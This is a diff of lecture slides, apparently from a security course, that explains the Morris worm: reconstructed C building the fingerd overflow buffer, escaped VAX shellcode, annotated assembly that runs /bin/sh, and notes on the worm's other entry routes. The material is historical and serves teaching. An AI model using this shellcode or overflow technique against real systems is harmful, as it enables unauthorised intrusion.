@@ -1,17 +1,17 @@
 
-### actual example: Morris worm (1)  {.smaller}
+### actual example: Morris worm (1) 
 
 
-```
+```c
     /* reconstructed from machine code */
     for(i = 0; i < 536; i++) buf[i] = '\0';
     for(i = 0; i < 400; i++) buf[i] = 1;
     /* actual shellcode */
     memcpy(buf + i,
-        ("\335\217/sh\0\335\217/bin\320\032\335\0"
-         "\335\0\335Z\335\003\320\034\\274;\344"
-         "\371\344\342\241\256\343\350\357"
-         "\256\362\351"),
+        ("\xdd\x8f/sh\0\xdd\x8f/bin\xd0\x1a\xdd\0"
+         "\xdd\0\xddZ\xdd\x03\xd0\x1c\\xbc;\xe4"
+         "\xf9\xe4\xe2\xa1\xae\xe3\xe8\xef"
+         "\xae\xf2\xe9"),
          28);
     /* frame pointer, return val, etc.: */
     *(int*)(&buf[556]) = 0x7fffe9fc;
@@ -24,41 +24,32 @@
 ```
 
 
-### Morris shellcode (VAX)  {.smaller}
+### Morris shellcode (VAX)
 
 
+```gnuassembler
+pushl   $68732f      /* "/sh\0" */
+pushl   $6e69622f    /* "/bin" */
+movl    sp, r10      /* r10 = "/bin/sh\0" (on stack) */
+pushl   $0           /* (execve arg 2; env) */
+pushl   $0           /* (execve arg 1; argv) */
+pushl   r10          /* (execve arg 0; file) */
+pushl   $3           /* ??arg count? */
+movl    sp,ap        /* set argptr = sp */
+chmk    $3b    /* switch to OS ("CHange Mode to Kernel") */
 ```
-pushl   $68732f      // "/sh\0"
-pushl   $6e69622f    // "/bin"
-movl    sp, r10      // r10 = "/bin/sh\0" (on stack)
-pushl   $0           // (execve arg 2; env)
-pushl   $0           // (execve arg 1; argv)
-pushl   r10          // (execve arg 0; file)
-pushl   $3           // ??arg count?
-movl    sp,ap        // set argptr = sp
-chmk    $3b    // switch to OS ("CHange Mode to Kernel")
-
-```
- 
 
 * write string /bin/sh on the stack (path to ‘‘shell’’)
 * make OS request to run specified program
 
 
-### actual example: Morris worm (2)  {.smaller}
-
+### actual example: Morris worm (2)
 
 * once getting a shell…
 * run commands to install program 
-
-   * vulnerable ‘fingerd’ program running with stdin/stdout connected to socket
- 
-<hr class="vspace" />
+   * vulnerable 'fingerd' program running with stdin/stdout connected to socket
 * multiple exploit techniques to get shell 
-
    * this fingerd buffer overflow
    * sendmail command injection
    * logging in with guessed passwords
-
 * installs self as <code>/usr/tmp/sh</code>
-
